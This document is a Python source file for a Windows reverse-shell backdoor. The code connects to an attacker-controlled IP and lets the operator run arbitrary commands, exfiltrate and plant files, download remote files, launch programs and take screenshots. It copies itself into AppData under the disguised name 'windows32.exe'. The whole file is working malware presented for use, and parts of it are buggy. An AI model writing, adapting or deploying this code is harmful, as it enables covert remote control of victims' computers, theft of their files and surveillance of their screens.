#!/usr/bin/python
#A Multi-functional shell for Windows, accepts several commands. Change ip and port in the 'connection' function
#download path --> Downloads a File from the Target PC
#upload path   --> Uploads a File to the Target PC
#get url       --> Downloads a File to the Target PC from any Website
#start path    --> Starts a Program on the Target PC
#screenshot    --> Takes a Screenshot of the Target's Monitor
#check         --> Checks for the Administrator Priviliges
#q             --> Exits the Reverse Shell

import socket
import subprocess
import json
import os
import base64
import shutil
import sys
import time
import requests
from mss import mss

def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data)


def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        #loops back if receive more or less than 1024
        except ValueError:
            continue

def is_admin():
    global is_admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'),'temp']))
    except:
        admin = "[!] User Privileges!"
    else:
        admin = "[+] Administrator Privileges!"

def screenshot():
    with mss() as screenshot:
        screenshot.shot()


def download(url):
    get_response = requests.get(url)
    #get the last part of an url
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def connection():
    while True:
        time.sleep(20)
        try:
            sock.connect(("xx.xx.xx.xx",54321)) #CHANGE IP & PORT HERE
            shell()
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'q':
            break
        elif command == "help":
            help_options = '''                  download path --> Download a File from the Target PC
                                upload path   --> Upload a File to the Target PC
                                get url       --> Download a File to the Target PC from any Website
                                start path    --> Start a Program on the Target PC
                                screenshot    --> Take a Screenshot of the Target's Monitor
                                check         --> Check for the Administrator Priviliges
                                q             --> Exit the Reverse Shell '''
            reliable_send(help_options)

        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue
        elif command[:8] == "download":
            with open(command[9:], "rb") as file:
                reliable_send(base64.b64encode(file.read()))
        elif command[:6] == "upload":
                with open(command[7:], "wb") as fin:
                    file_data = reliable_recv()
                    fin.write(base64.b64decode(file_data))
        elif command[:3] == "get":
            try:
                download(command[4:])
                reliable_send("[+] Downloaded File from Specified URL.")
            except:
                reliable_send("[-] Failed to Download.")
        elif command[:10] == "screenshot":
            try:
                screenshot()
                with open("monitor-1.png","rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[!] Failed to take a screenshot.")
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started!")
            except:
                reliable_send("[!] Failed to Start.")
        elif command[:5] == "check":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliable_send("Can't perform the check!")
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

#put our shell in a safer place in windows and rename it            
location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()
sock.close()